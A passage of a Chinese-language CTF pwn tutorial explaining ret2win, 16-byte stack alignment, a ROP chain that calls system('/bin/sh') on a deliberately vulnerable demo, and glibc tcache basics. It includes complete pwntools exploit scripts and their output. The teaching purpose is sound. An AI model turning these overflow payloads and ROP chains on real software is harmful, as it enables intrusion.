小端序的意思是 \code{0x40125e} 在記憶體裡長這樣：\code{5e 12 40 00 00 00 00 00}。

\subsection{那個多出來的 ret 是幹什麼的}

這是很多人第一次寫 ROP 會踩的坑，先講結論：

\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item x86-64 的 System V ABI 規定：\textbf{執行 \code{call} 之前，\code{rsp} 必須是 16 的倍數}。
  \item 有些 libc 函式（例如 \code{system}、\code{printf} 在某些路徑）會用 SSE 指令
        \code{movaps} 把資料搬到 16-byte 對齊的位置；\code{rsp} 沒對齊就直接 SIGSEGV。
  \item 插一個「只有 \code{ret} 一個指令」的 gadget，等於把 \code{rsp} \textbf{多推 8 bytes}，
        用來微調對齊。
\end{itemize}

\begin{warnbox}[誠實說明：這題其實加不加都會過]
我實測過這題與下一題（weakness），\textbf{加不加那個 \code{ret} 都拿得到 flag}：

\begin{lstlisting}[style=raw]
ret2win :  no ret -> FLAG OK     +ret -> FLAG OK
weakness:  no ret -> FLAG OK     +ret -> FLAG OK
\end{lstlisting}

原因是這兩題的 \code{win()} 只呼叫 \code{fopen}/\code{fgets}/\code{printf}，
在題目使用的 glibc 版本下這幾個函式不會因為 \code{rsp} 差 8 bytes 就爆掉。
\textbf{但這是運氣，不是通則。}第 \ref{chap:rop} 章我會做一個\textbf{真的會爆}的示範，
讓你親眼看到「只差一個 \code{ret} 就 SIGSEGV」。
所以在真實比賽裡，看到 chain 爆掉而位址明明正確時，第一個要懷疑的就是對齊。
\end{warnbox}

\subsection{完整腳本}

\begin{lstlisting}[style=py]
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = '/home/kzzz/Documents/code/ctf/ctf7/pwn/work/ret2win/main.out'
elf = ELF(BIN, checksec=False)

WIN = elf.symbols['win']        # 0x40125e
RET = 0x40101a                  # 一個孤立的 `ret` 指令，用來對齊

OFFSET = 0xa + 8                # buf[10] + saved rbp = 18

payload  = b'A' * OFFSET
payload += p64(RET)
payload += p64(WIN)

io = process(BIN, cwd=os.path.dirname(BIN))    # cwd 要在題目目錄，才找得到 flag.txt
io.sendlineafter(b'name?\n', payload)
print(io.recvall(timeout=2).decode(errors='replace'))
\end{lstlisting}

\begin{keybox}[\code{cwd} 與 \code{RET} 的來源]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \code{process(BIN, cwd=...)}：flag 是 \code{./flag.txt}，工作目錄不對就 \code{cat} 不到。
  \item \code{RET = 0x40101a}：這是從 \code{objdump} 裡挑一個「\code{c3} 前面沒有別的雜訊」的位置，
        最方便的做法是找 \code{__libc_csu_init} 附近的 \code{ret}，或用 \code{ROPgadget --only "ret"}。
        這題剛好 \code{40101a: c3  ret}。
\end{itemize}
\end{keybox}

\subsection{執行結果}

\begin{lstlisting}[style=raw]
[+] Starting local process '.../work/ret2win/main.out': pid 1788470
Hello, AAAAAAAAAAAAAAAAAA@!
OWASP{local_test_flag_ret2win}
\end{lstlisting}

（\code{Hello, AAAA...@!} 裡那個 \code{@} 就是你 \code{ret} 位址的第一個 byte \code{0x1a}
被 \code{printf("\%s")} 印出來的殘骸——因為 \code{gets} 之後程式還是先做了一次
\code{printf("Hello, \%s!")}，那時你的 payload 已經蓋上去了。）

\begin{keybox}[這題你要帶走的三件事]
\begin{enumerate}[leftmargin=1.4em,itemsep=1pt]
  \item \textbf{offset $=$ buffer 大小 $+$ 8}（saved rbp）。看組語的 \code{lea rax,[rbp-0x??]} 最準。
  \item \textbf{No PIE} 才能直接寫死位址；有 PIE 就得先 leak（第 \ref{chap:vault} 章）。
  \item \textbf{「目標函式在程式裡」} 是 ret2win 的前提。如果 flag 只能靠 \code{system("/bin/sh")} 拿，
        你就需要 \textbf{ROP}——下一章。
\end{enumerate}
\end{keybox}

\section{第二題：weakness（soul-stone）}
\label{chap:weakness}

這一題技術上和第一題一模一樣——還是 ret2win。我把它獨立成一章，是因為它會教你
\textbf{一個很重要的檢查習慣}：不要相信「buffer 看起來多大」，要去組語裡看 \code{lea} 的偏移量。

\subsection{先看防禦機制}

\begin{lstlisting}[style=raw]
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
\end{lstlisting}

和 ret2win 完全相同：\textbf{沒有 canary、沒有 PIE}。
看到這個組合，你的第一反應應該就是「找 overflow、找目標函式」。

\subsection{程式結構}

\begin{lstlisting}[style=asm]
0000000000401297 <main>:
  4012b8:  call   4010c0 <setvbuf@plt>     ; 關掉緩衝，方便互動
  4012d6:  call   4010c0 <setvbuf@plt>
  4012f4:  call   4010c0 <setvbuf@plt>
  4012f9:  call   4011ee <vault>           ; 唯一的重點
\end{lstlisting}

\code{main} 設完緩衝就呼叫 \code{vault}。而 \code{vault} 裡有兩個關鍵：

\begin{lstlisting}[style=asm]
00000000004011ee <vault>:
  4011ee:  endbr64
  4011f2:  push   rbp
  4011f3:  mov    rbp,rsp
  4011f6:  sub    rsp,0x20                    ; <=== 配置了 0x20 bytes 的區域變數
  4011fa:  ...  puts("===============");
  401209:  ...  puts("     SOUL STONE VAULT");
  401218:  ...  puts("===============");
  401227:  ...  printf("Enter your name: ");
  40124a:  lea    rax,[rbp-0x20]               ; <=== buffer 起點
  40124e:  mov    rdi,rax
  401256:  call   4010a0 <gets@plt>           ; <=== 不限長度
  40125b:  lea    rax,[rbp-0x20]
  401271:  call   401090 <printf@plt>         ; printf("Hello, %s!", buf)
  401276:  ...  puts("The Soul Stone remains sealed...");
  401295:  leave
  401296:  ret
\end{lstlisting}

\begin{keybox}[offset 的算法完全一樣]
\code{buffer $= 0x20$}，所以

\[
\text{offset} = 0x20 + 8 = 0x28 = 40
\]

填 \code{b'A' * 0x28} 之後，接下來 8 bytes 就是 return address。
\end{keybox}

\subsection{目標：\texttt{soul\_stone()}}

\begin{lstlisting}[style=asm]
00000000004011b6 <soul_stone>:
  4011b6:  endbr64
  4011ba:  push   rbp
  4011bb:  mov    rbp,rsp
  4011be:  lea    rax,[rip+0xe43]   # 402009
  4011c5:  mov    rdi,rax
  4011c8:  call   401080 <puts@plt>          ; puts("[+] Soul Stone unlocked!")
  4011cd:  lea    rax,[rip+0xe54]   # 402028
  4011d4:  mov    rdi,rax
  4011d7:  call   401080 <puts@plt>          ; puts("OWASP{S0ul_St0ne_...}")
  4011ec:  pop    rbp
  4011ed:  ret
\end{lstlisting}

注意 \code{0x402028} 這個位址——它就是 flag 本身：

\begin{lstlisting}[style=raw]
$ strings -a -t x soul | grep -i owasp
    2028 OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
\end{lstlisting}

\begin{whybox}[這題的 flag 是「印出來的」，不是「讀檔案」]
ret2win 的 \code{win()} 是 \code{fopen("flag.txt")} 把檔案內容讀進來印；
weakness 的 \code{soul_stone()} 則是直接把一個字串常數 \code{puts} 出去，
那個常數就編在 \code{.rodata} 裡。

所以：
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item 這題\textbf{不需要} flag.txt，\code{cwd} 不重要。
  \item 但這也意味著你能直接用 \code{strings} 把 flag 看出來——
        \textbf{這是題目設計上的小漏洞}，正式比賽不該這樣。當成一個提醒就好。
\end{itemize}
\end{whybox}

\subsection{腳本}

\begin{lstlisting}[style=py]
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = '/home/kzzz/Documents/code/ctf/ctf7/pwn/work/weakness/soul'
elf = ELF(BIN, checksec=False)

SOUL_STONE = elf.symbols['soul_stone']      # 0x4011b6
RET        = 0x40101a                       # 對齊用（同上一章）

OFFSET = 0x20 + 8                           # buf[0x20] + saved rbp

payload  = b'A' * OFFSET
payload += p64(RET)
payload += p64(SOUL_STONE)

io = process(BIN, cwd=os.path.dirname(BIN))
io.sendlineafter(b'Enter your name: ', payload)
print(io.recvall(timeout=2).decode(errors='replace'))
\end{lstlisting}

\subsection{執行結果}

\begin{lstlisting}[style=raw]
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@!
The Soul Stone remains sealed...

[+] Soul Stone unlocked!
OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
[*] Process stopped with exit code -11 (SIGSEGV)
\end{lstlisting}

\begin{warnbox}[拿到 flag 之後 SIGSEGV 是正常的]
\code{soul_stone()} 執行完 \code{ret} 時，stack 上接下來那格是我們亂填的資料，
所以它一跳就爆。\textbf{flag 已經印出來了，不影響得分。}
反過來說，這也是判斷「你打對了」的一個線索：\emph{有印出目標訊息 + 隨後 SIGSEGV}
通常代表「chain 頭對、尾巴沒收乾淨」。
\end{warnbox}

\subsection{這題多學到的一件事：offset 要用組語驗證}

很多人在這一步會猜錯。假設你只看到 \code{sub rsp,0x20}，你可能會想「那 buffer 是 0x20」；
但 \code{sub rsp,0x20} 指的是\textbf{整個 frame} 少 0x20，不一定等於 buffer 大小。
真正的答案永遠在 \code{gets} 前面那一行：

\begin{lstlisting}[style=asm]
lea    rax,[rbp-0x20]     ; <== 這個 -0x20 才是 buffer 起點
mov    rdi,rax
call   gets@plt
\end{lstlisting}

\begin{keybox}[養成反射動作]
看到 \code{gets} / \code{read} / \code{scanf("\%s")}，就往回找它的第一個參數是
\code{rbp-0x??} 還是 \code{rsp+0x??}，\textbf{那個數字才是 buffer 大小}。
\end{keybox}

\section{專題課 A：從零開始的 ROP}
\label{chap:rop}

前面兩題都是「跳到一個現成的函式」。但真實題目很少這麼好心：目標通常不是一個 \code{win()}，
而是 \code{system("/bin/sh")}——你要\textbf{呼叫一個函式，還要傳參數給它}。
再加上 NX 讓你不能把 shellcode 寫進 stack 執行，那該怎麼辦？答案就是 ROP。

這一章我不打 CTF 題，而是自己做一個小程式 \file{rop\_demo}，
把 ROP 的每個零件拆開給你看。打完這一章，你再看後面三題的 heap 題會輕鬆很多，
因為\textbf{ROP 和 heap 攻擊其實是同一件事}：都是在「控制別人的資料」，
只是一個控制 stack，一個控制 heap。

\subsection{為什麼 ret2win 不夠用}

\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
  \item \textbf{參數問題}：\code{win()} 不吃參數。
        只要把位址填進 \code{return address} 就好。
        但如果目標是 \code{system("/bin/sh")}，那就不一樣了：
        得先讓 \code{rdi} 指向字串 \code{"/bin/sh"}，
        然後才跳到 \code{system}。
        \textbf{一個 \code{return address} 塞不下兩件事}。
  \item \textbf{NX}：stack 不可執行，所以「把 shellcode 寫進去再跳過去」這條路被封死。
  \item \textbf{ASLR}：就算知道 \code{system} 在 libc 裡，位址每次都不一樣，需要先 leak。
\end{enumerate}

ROP（Return-Oriented Programming）的答案是：

\begin{keybox}[一句話講完 ROP]
\textbf{不要注入程式碼，而是把程式裡「本來就有的片段」串起來。}
每個片段都以 \code{ret} 結尾，而被 \code{ret} 彈進 \code{rip} 的位址來自 stack——
所以\textbf{只要你控制 stack，你就能遙控程式一段一段地執行你排好的順序}。
\end{keybox}

\subsection{關鍵：\code{ret} 是一個「從 stack 讀位址的跳躍」}

回到第二章那句定義：

\begin{lstlisting}[style=asm]
ret   ==   pop  rip        ; 把 rsp 指的那 8 bytes 彈進 rip，然後 rsp += 8
\end{lstlisting}

注意兩件事：
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \code{ret} 執行完，\code{rsp} 會\textbf{往高位址移動 8 bytes}（因為 stack 是往下長的，
        pop 等於「收回」）。所以\textbf{下一格}就是下一次 \code{ret} 會讀的地方。
  \item 你已經用 overflow 控制了這塊記憶體 $\Rightarrow$ \textbf{你控制了「下一個要跳去哪裡」，而且可以控制很多次}。
\end{itemize}

\begin{whybox}[把 ROP chain 想成「你自己造的 call stack」]
正常的程式：\code{call} 幫你把返回位址 push 上去，\code{ret} 幫你彈回來。
ROP 的世界：\textbf{你手動把「返回位址」排成一列}，
每一格都是「某個 gadget 的位址」，gadget 執行完的 \code{ret} 又去讀下一格。
於是你用 data（stack 上的位址）遙控了 control flow。
\end{whybox}

\subsection{gadget：以 \code{ret} 結尾的小片段}

gadget 就是「一串指令，最後一個是 \code{c3}（\code{ret}）」。
最基本、最常用的兩個是：

\begin{longtable}{@{}p{4.6cm}p{3.2cm}p{7.0cm}@{}}
\toprule
\textbf{gadget} & \textbf{機器碼} & \textbf{效果}\\
\midrule
\endhead
\code{pop rdi ; ret} & \code{5f c3} & 從 stack 彈一格進 \code{rdi}，然後 ret。\\
\code{ret}           & \code{c3}    & 什麼都不做，只是把 \code{rsp} 往前推 8 bytes。\\
\bottomrule
\end{longtable}

為什麼是 \code{rdi}？因為第二章那張 ABI 表：\textbf{第一個整數/指標參數在 \code{rdi}}。
所以 \code{pop rdi ; ret} 就是「把下一個 8 bytes 當作第一個參數」。

\begin{keybox}[怎麼找 gadget]
\begin{lstlisting}[style=sh]
ROPgadget --binary ./chal | grep 'pop rdi ; ret'
ropper -f ./chal --search 'pop rdi'
\end{lstlisting}
或在 pwntools 裡：
\begin{lstlisting}[style=py]
rop = ROP(elf)
rop.rdi            # 自動找 pop rdi ; ret
rop.find_gadget(['pop rdi', 'ret'])
\end{lstlisting}
\textbf{現實提醒}：小程式裡常常一個 \code{pop rdi ; ret} 都找不到（編譯器不會產生沒用到的指令）。
這時候有三條路：(1) 從 libc 裡找（需要 leak）；(2) 用 \code{ret2csu}（見 \ref{sec:ret2csu}）；
(3) 自己寫一個（本講義的 demo 就是這樣做，見下節）。
\end{keybox}

\subsection{一個真的 ROP chain：逐步拆解}

\file{rop\_demo.c} 是我為了教學寫的，重點是\textbf{故意讓它沒有現成的 gadget}，
再把一個 \code{pop rdi ; ret} 用 \code{naked} 函式「種」進去：

\begin{lstlisting}[style=c]
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* 讓 system@plt 留在 binary 裡（其實從沒被呼叫） */
void unused(void) { system("echo never called"); }

/* 手工種一個 pop rdi ; ret，讓 demo 自給自足。
   真實題目要從 libc 拿（需先 leak）或用 ret2csu。 */
__attribute__((naked)) void gadget_pop_rdi_ret(void) {
    __asm__ volatile("pop %rdi\n ret\n");
}

char *mygets(char *s) { int i = 0; char c;          /* 不限長度，等同 gets() */
    while (read(0, &c, 1) == 1 && c != '\n') s[i++] = c;
    s[i] = 0; return s; }

void vuln(void) { char buf[64]; mygets(buf); puts("bye"); }

int main(void) { setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IONBF, 0);
                 puts("[*] rop demo - give me a line:"); vuln(); return 0; }
\end{lstlisting}

編譯指令（\code{-no-pie} 讓我們可以寫死位址）：

\begin{lstlisting}[style=sh]
gcc -fno-stack-protector -no-pie -O0 rop_demo.c -o rop_demo
\end{lstlisting}

\begin{warnbox}[為什么要自己寫 \code{mygets}]
現代 GCC 直接拒絕編譯 \code{gets}（連結時會給你 \code{implicit declaration} 的錯誤）。
所以 demo 用 \code{read(0,\&c,1)} 迴圈手寫一個。\textbf{行為和 \code{gets} 一樣：不檢查長度}。
\end{warnbox}

四個關鍵位址（都是從 \code{nm} / \code{objdump} / \code{ELF} 取得）：

\begin{longtable}{@{}p{5.2cm}p{3.0cm}p{6.6cm}@{}}
\toprule
\textbf{符號} & \textbf{位址} & \textbf{用途}\\
\midrule
\endhead
\code{pop rdi ; ret}    & \code{0x40117c} & 設第一個參數\\
\code{mygets}           & \code{0x401181} & 把字串寫進指定位置（這裡當「寫入器」）\\
\code{system@plt}       & \code{0x401040} & 目標函式\\
\code{.bss}（\code{0x404230}）& \code{0x404230} & 可寫、位址固定的空區域\\
\bottomrule
\end{longtable}

先看漏洞點：

\begin{lstlisting}[style=asm]
00000000004011e9 <vuln>:
  4011e9:  push   rbp
  4011ea:  mov    rbp,rsp
  4011ed:  sub    rsp,0x40              ; buf[64]
  4011f1:  lea    rax,[rbp-0x40]
  4011f5:  mov    rdi,rax
  4011f6:  call   401181 <mygets>       ; 不限長度 -> overflow
  4011fb:  puts("bye")
  4011ff:  leave
  401200:  ret
\end{lstlisting}

所以 \code{offset = 0x40 + 8 = 0x48 = 72}。

\subsubsection{chain 的內容}

\begin{lstlisting}[style=raw]
    [ 72 bytes 的 'A' ][ saved rbp 被蓋掉 ]
    +0x48  pop rdi ; ret      0x40117c
    +0x50  .bss               0x404230      <-- 這是 pop 進 rdi 的值
    +0x58  mygets             0x401181      <-- 呼叫 mygets(0x404230)
    +0x60  pop rdi ; ret      0x40117c
    +0x68  .bss               0x404230      <-- 這是要傳給 system 的參數
    +0x70  system@plt         0x401040      <-- 呼叫 system(0x404230)
\end{lstlisting}

\begin{keybox}[讀 chain 的方法：從上往下，一次「吃」兩格或一格]
\begin{longtable}{@{}p{1.4cm}p{4.2cm}p{9.4cm}@{}}
\toprule
\textbf{步} & \textbf{執行到} & \textbf{發生什麼事}\\
\midrule
\endhead
1 & \code{pop rdi ; ret} & \code{rdi = 0x404230}（吃掉下一格），然後 \code{ret} 讀再下一格\\
2 & \code{mygets} & 呼叫 \code{mygets(0x404230)}：等我們輸入一行字，寫到 \code{.bss}。做完它自己的 \code{ret} 讀再下一格\\
3 & \code{pop rdi ; ret} & \code{rdi = 0x404230}（現在那裡已經是 \code{"/bin/sh"}），再 \code{ret}\\
4 & \code{system@plt} & \code{system("/bin/sh")} $\Rightarrow$ \textbf{拿到 shell}\\
\bottomrule
\end{longtable}
\end{keybox}

\begin{whybox}[為什麼不能直接 \code{system("/bin/sh")}？非得先寫進 .bss？]
因為 \textbf{binary 裡根本沒有 \code{"/bin/sh"} 這個字串}。你可以自己驗證：

\begin{lstlisting}[style=sh]
$ strings -a ./rop_demo | grep '/bin/sh'
$ echo $?
1                     # 找不到
\end{lstlisting}

所以我們用 \code{mygets} 當「寫入器」，把 \code{/bin/sh} 寫到一個\textbf{位址固定又可寫}的地方。
\code{.bss} 就是這種地方（未初始化的全域變數區，No PIE 時位址永遠是 \code{0x404230}）。

\textbf{這就是 ROP 的通用套路}：gadget 只能設暫存器，不能「產生新資料」，
所以需要資料時，就\textbf{用一個會寫入的函式（\code{gets}/\code{read}/\code{mygets}）先把資料放好}，
再讓真正想呼叫的函式去讀它。後面 heap 題的 tcache poisoning 是同一招的變形。
\end{whybox}

\subsection{16-byte 對齊：一個真的會爆的示範}

現在講第三章那個「多餘的 \code{ret}」。我用同一支 \file{rop\_demo}
做 A/B 對照：兩條 chain 只差「開頭有沒有多插一個 \code{ret}」。

\begin{lstlisting}[style=py]
for label, extra in (('aligned chain        ', b''),
                     ('chain + one extra ret', p64(RET))):
    payload  = b'A' * (0x40 + 8) + extra
    payload += p64(POP) + p64(BSS) + p64(mygets)
    payload += p64(POP) + p64(BSS) + p64(system)
    ...
\end{lstlisting}

實測結果：

\begin{lstlisting}[style=raw]
aligned chain         -> SHELL OK
chain + one extra ret -> SIGSEGV, no shell
\end{lstlisting}

\begin{whybox}[差 8 bytes 為什麼會死？]
x86-64 的 ABI 要求：\textbf{執行 \code{call} 前 \code{rsp} 必須 16-byte 對齊}。
編譯器產生的函式開頭是 \code{push rbp}（-8）加 \code{sub rsp,N}，
所以進入函式後 \code{rsp \%= 16 == 8}，等到它要 \code{call} 下一個函式時又會剛好對齊。

你多插一個 \code{ret}，等於讓 \code{rsp} 少前進 8 bytes，
於是 \code{system} 內部的 SSE 指令 \code{movaps} 搬到了一個沒對齊的位址 $\Rightarrow$ SIGSEGV。
\textbf{它不是在參數或位址上出錯，純粹是對齊。}
所以 debug 的時候如果「位址都對、邏輯都對，但就是 SIGSEGV」，
第一件事就是：在 chain 最前面加一個 \code{ret} 試試。
\end{whybox}

\begin{keybox}[怎麼判斷要不要加？]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item 進去 \code{system} 的那一格，前面少一個 \code{ret} 就爆 $\Rightarrow$ 加一個 \code{ret}。
  \item 反過來（加了反而爆）就把 \code{ret} 拿掉。
  \item 也可以看 gdb：\code{movaps} 爆掉的位址結尾是不是 8 而不是 0。
\end{itemize}
\textbf{這是經驗法則，不是定理}——第三章的 ret2win 就是「加不加都過」，
因為它的目標函式剛好不挑對齊。
\end{keybox}

\subsection{完整腳本與輸出}

\begin{lstlisting}[style=py]
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'; context.log_level = 'info'

e = ELF('./rop_demo', checksec=False)
POP_RDI = e.symbols['gadget_pop_rdi_ret']    # 0x40117c
MYGETS  = e.symbols['mygets']                # 0x401181
SYSTEM  = e.plt['system']                    # 0x401040
BSS     = e.bss(0x200)                       # 0x404230

payload  = b'A' * (0x40 + 8)
payload += p64(POP_RDI) + p64(BSS) + p64(MYGETS)
payload += p64(POP_RDI) + p64(BSS) + p64(SYSTEM)

io = process('./rop_demo')
io.recvuntil(b'line:\n')
io.sendline(payload)                          # 第 1 次讀：ROP chain
io.sendline(b'/bin/sh')                       # 第 2 次讀：mygets() 把這行寫進 .bss
io.sendline(b'echo ROP_SHELL_OK; id -un')     # 第 3 次讀：這時候已經是 shell
print(io.recvall(timeout=3).decode(errors='replace'))
\end{lstlisting}

\begin{lstlisting}[style=raw]
bye
ROP_SHELL_OK
kzzz
\end{lstlisting}

看到 \code{bye}（\code{vuln} 的 \code{puts}）之後就跳出 \code{ROP\_SHELL\_OK}，
代表我們真的拿到了 \code{system("/bin/sh")}。

\begin{keybox}[注意三次 \code{sendline} 的對應關係]
這是新手最容易搞混的地方——ROP chain 是「資料」，但其中一個環節會\textbf{再讀一次輸入}：

\begin{longtable}{@{}p{2.4cm}p{4.6cm}p{8.0cm}@{}}
\toprule
\textbf{第幾次} & \textbf{被誰讀} & \textbf{內容}\\
\midrule
\endhead
1 & \code{vuln} 的 \code{mygets} & 整條 ROP chain（會 overflow）\\
2 & chain 裡呼叫的 \code{mygets(0x404230)} & 字串 \code{/bin/sh}，寫進 \code{.bss}\\
3 & \code{system} 進 shell 之後 & 你要下的指令\\
\bottomrule
\end{longtable}
\end{keybox}

\subsection{真實題目的 gadget 從哪裡來}
\label{sec:ret2csu}

demo 裡的 \code{pop rdi ; ret} 是我種的。真實的題目你有三條路：

\begin{longtable}{@{}p{3.6cm}p{11.4cm}@{}}
\toprule
\textbf{來源} & \textbf{說明與限制}\\
\midrule
\endhead
libc 裡的 gadget &
  最常見。libc 很大，\code{pop rdi ; ret}、\code{pop rsi ; ret}、甚至 \code{one\_gadget}
  都有。\textbf{前提是要先 leak libc base}（例如 \code{printf} 洩漏一個 libc 位址後扣掉 offset）。\\
\code{ret2csu} &
  用 \code{\_\_libc\_csu\_init} 裡面那兩段程式碼：
  一段能 \code{pop rbx / rbp / r12 / r13 / r14 / r15 ; ret}，
  另一段是 \code{mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call [r15+rbx*8]}。
  組合起來可以控制 \code{rdi/rsi/rdx} 並呼叫任意函式。\\
   & $\Rightarrow$ \textbf{不需要 libc}，在 No PIE 的 binary 裡就能用。是「找不到 \code{pop rdi}」時的救命工具。\\
手工植入 &
  像本 demo。實務上只有你自己寫的練習程式才會這樣做，但它是理解 ROP 最好的方式。\\
\bottomrule
\end{longtable}

\begin{keybox}[ROPE 的萬用句型]
不管哪一題，chain 幾乎都是這個形狀：

\begin{lstlisting}[style=raw]
[ padding + saved rbp ]
[ gadget: 設參數1 ] [ 參數1 ]
[ gadget: 設參數2 ] [ 參數2 ]
[ 目標函式 ]                      <-- 例如 system / execve / 一個 print flag 的函式
[ 收尾 ]                          <-- 例如再呼叫 exit()，或直接不管（反正要爆）
\end{lstlisting}

把這個句型記住，你就會發現\textbf{後面三題的 heap 攻擊，其實是把「設參數」換成「改資料」}，
本質上還是同一件事。
\end{keybox}

\section{專題課 B：Heap 基礎}
\label{chap:heap}

後面三題全部是 heap 題。這一章把 \code{malloc}/\code{free} 背後的規則講清楚，
你才看得懂為什麼「改一個 8 bytes 的 \code{fd}」可以讓下次 \code{malloc} 回傳任意位址。

\subsection{為什麼要懂 heap}

\begin{longtable}{@{}p{3.2cm}p{11.8cm}@{}}
\toprule
\textbf{你看到的} & \textbf{你該想到的}\\
\midrule
\endhead
\code{Canary found} + \code{PIE enabled} &
  Stack overflow 幾乎不用想了（canary 擋住、位址又不固定）。
  題目通常會給你 \code{malloc/free/edit/show} 選單 $\Rightarrow$ \textbf{這是 heap 題}。\\
選單有 \code{free} 但指標沒清 & \textbf{UAF}（use-after-free）。這是五題裡三題的根。\\
\code{show} 能印出內容 & 你能讀 free 掉的 chunk $\Rightarrow$ \textbf{leak}（heap base、libc、PIE）。\\
\code{edit} 能寫 free 掉的 chunk & 你能改 \code{fd} $\Rightarrow$ \textbf{tcache poisoning}。\\
\bottomrule
\end{longtable}

\begin{keybox}[本課的目標]
讀完你應該能回答這四個問題：
\begin{enumerate}[leftmargin=1.4em,itemsep=1pt]
  \item \code{malloc(0x38)} 背後實際吃掉多少 bytes？\\
  \item \code{free} 完之後，那塊記憶體裡被寫了什麼？\\
  \item 為什麼從 \code{fd} 可以算出 heap 基底？\\
  \item 為什麼 \code{free} 兩次一樣大的 chunk 會被偵測到，而「free A、free B、free A」不會？
\end{enumerate}
\end{keybox}

\subsection{malloc 不是「配一塊剛好大的」}

每次 \code{malloc(n)}，glibc 會給你一塊\textbf{帶標頭的} chunk。標頭 16 bytes：
\code{prev\_size}（8）與 \code{size}（8）。\code{malloc} 回傳的是\textbf{標頭之後}的位址。

\begin{center}
\begin{tikzpicture}[font=\ttfamily\small,node distance=0pt,
                    every node/.style={draw,minimum width=7.0cm,minimum height=0.55cm}]
  \node[fill=blue!12] (ps) {prev\_size};
  \node[fill=blue!12,below=of ps] (sz) {size};
  \node[fill=green!14,below=of sz,minimum height=1.5cm] (us) {user data};
  \node[fill=blue!12,below=of us] (nx) {下一塊的 prev\_size};
  \draw[->,thick,red] ($(sz.south west)+(-0.85,-0.7)$) -- ($(us.north west)+(-0.85,0.0)$);
\end{tikzpicture}
\end{center}

也就是：
\[
\text{chunk 位址} \xrightarrow{+0x8} \text{size}
\xrightarrow{+0x10} \textbf{malloc 回傳的位址}
\]

\begin{keybox}[size 的算法]
\[
\text{chunk size} = (\text{request} + 8 + 15)\ \&\ \sim 15
\]

白話：\textbf{request 加上標頭，再無條件進位到 16 的倍數}。而且最小是 \code{0x20}。
\end{keybox}

\begin{longtable}{@{}p{3.4cm}p{3.4cm}p{8.2cm}@{}}
\toprule
\textbf{\code{malloc(n)}} & \textbf{chunk size} & \textbf{你會在哪一題看到}\\
\midrule
\endhead
\code{0x18} & \code{0x20} & 最小 chunk。\\
\code{0x20} & \code{0x30} & soul-vault 的 \code{name}（\code{read\_string(name, 0x20)}）。\\
\code{0x38} & \code{0x40} & soul-vault 偽造 Soul 時用的 \code{size=0x38}。\\
\code{0x40} & \code{0x50} & soul-archive 的 Soul 與 TransferRecord（\code{malloc(0x40)}）。\\
\code{0x100} & \code{0x110} & house-of-water 的兩個 chunk。\\
\bottomrule
\end{longtable}

\begin{warnbox}[最常見的計算錯誤]
「我 \code{malloc(0x40)}，所以 tcache bin 是 \code{0x40}」$\Rightarrow$ \textbf{錯}，是 \code{0x50}。
\textbf{bin 的名稱一律是 chunk size（含標頭），不是 request。}
後面 house-of-water 那題我們要「毒 \code{0x100} 的 bin」，實際上動的是 \code{0x110} 的鏈。
\end{warnbox}

\subsection{free 之後 chunk 裡長什麼樣}

chunk 被 \code{free} 之後，glibc 會拿它的\textbf{前 16 bytes（也就是原本的 user data）}來做紀錄：

\begin{center}
\begin{tikzpicture}[font=\ttfamily\small,node distance=0pt,
                    every node/.style={draw,minimum width=7.0cm,minimum height=0.55cm}]
  \node[fill=blue!12] (h1) {prev\_size};
  \node[fill=blue!12,below=of h1] (h2) {size};
  \node[fill=orange!18,below=of h2] (f1) {fd（在 tcache = next 指標）};
  \node[fill=orange!18,below=of f1] (f2) {key（glibc 2.34+ 的 double-free 標記）};
\end{tikzpicture}
\end{center}

\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \code{fd}：指向「同一個 bin 裡下一塊」。
  \item \code{key}：glibc 2.34 之後寫入的隨機值（\code{tcache\_key}）。
        \textbf{同一個行程裡每一塊的 key 都一樣}，見下面的實測。
\end{itemize}

實測（house-of-water，兩個 \code{0x100} chunk，先 free A 再 free B）：

\begin{lstlisting}[style=raw]
A 的 user data: 1c 28 83 5a 05 00 00 00 | b2 3a 81 8d 51 23 42 2c
B 的 user data: 0c ed 02 68 ad 55 00 00 | b2 3a 81 8d 51 23 42 2c
                  ^^^^ fd ^^^^            ^^^^ key（兩塊相同）^^^^
\end{lstlisting}

\begin{keybox}[LIFO：後 free 的排在前面]
tcache 是\textbf{後進先出}的單向鏈。\code{free(A); free(B);} 之後：

\begin{lstlisting}[style=raw]
tcache[0x110] 的頭  ->  B  ->  A  ->  NULL
\end{lstlisting}

所以下一次 \code{malloc(0x100)} 會先拿到 \textbf{B}，再一次才拿到 \textbf{A}。
每個 bin 最多存 \textbf{7 塊}，第 8 塊會被丟到別的 bin（fastbin/unsorted），
但本系列三題都只用到 7 塊以內。
\end{keybox}

\subsection{tcache bins 速查}

\begin{longtable}{@{}p{4.0cm}p{11.0cm}@{}}
\toprule
\textbf{項目} & \textbf{數值}\\
\midrule
\endhead
bin 的數量 & 64 個\\
bin 的間隔 & \code{0x10}（因為 chunk size 一定是 16 的倍數）\\
bin 的範圍 & \code{0x20} \verb|~| \code{0x410}\\
每個 bin 的容量 & 7 塊\\
順序 & LIFO\\
\bottomrule
\end{longtable}

\textbf{bin 怎麼選}：拿 chunk size 直接當索引。\code{malloc(0x100)} 產生 \code{0x110} 的 chunk
$\Rightarrow$ 進 \code{tcache[0x110]}。

\subsection{safe-linking：fd 不是指標，而是「加密過的」指標}
\label{sec:safelink}

glibc 2.32 之後，tcache 的 \code{fd} 被寫成：

\[
\boxed{\texttt{fd} = \texttt{next}\ \oplus\ (\texttt{這塊 chunk 的位址} \gg 12)}
\]

